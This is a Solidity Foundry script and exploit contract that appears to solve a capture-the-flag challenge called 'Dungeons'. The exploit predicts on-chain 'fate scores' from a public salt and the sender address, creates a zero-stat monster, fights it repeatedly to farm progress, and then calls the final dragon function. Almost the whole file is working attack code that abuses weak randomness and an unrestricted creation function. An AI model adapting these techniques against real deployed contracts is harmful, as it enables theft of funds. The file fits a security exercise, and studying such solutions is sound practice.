// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

interface IDungeons{
    function createCharacter(string memory _name, uint256 _class) external payable ;
    function finalDragon() external;
    function distributeRewards(bytes32 messageHash, uint8 v, bytes32 r, bytes32 s) external ;
    function salt()external view returns (string memory);
    function createMonster(string memory _name, uint256 _health, uint256 _attack) external ;
     function fightMonster(uint256 _monsterIndex) external;
}

interface ISetup{
    function challengeInstance()external view returns(IDungeons);
    function isSolved() external view returns (bool);
}

contract Exploit {

    ISetup setup;
    IDungeons dungeons;
    uint256 fateScore1 ;
    uint256 fateScore2;
    constructor(address _setup){
        setup=ISetup(_setup);
        dungeons=setup.challengeInstance();
        
        
    }

    function pwn()public payable{
        fateScore2=uint256(keccak256(abi.encodePacked(msg.sender, dungeons.salt(), uint256(999)))) % 100;
        fateScore1 = uint256(keccak256(abi.encodePacked(msg.sender, dungeons.salt(), uint256(42)))) % 100;
        dungeons.createCharacter{value:msg.value}("h4ck3r",1);
        dungeons.createMonster("m0nst3r", 0, 0);
        for(uint8 i=0;i<20;i++){
            dungeons.fightMonster(0);
        }
        dungeons.finalDragon();
    }

    receive()external payable{}
}



contract Solve is Script{
    Exploit exploit;

    function run()public{
        address setup=address(0x2174Fdb141D81DDE1ae75056f88c5d8d87A5B9d7);
        vm.startBroadcast();
        exploit=new Exploit(setup);
        exploit.pwn{value:0.1 ether}();
        vm.stopBroadcast();
    }
}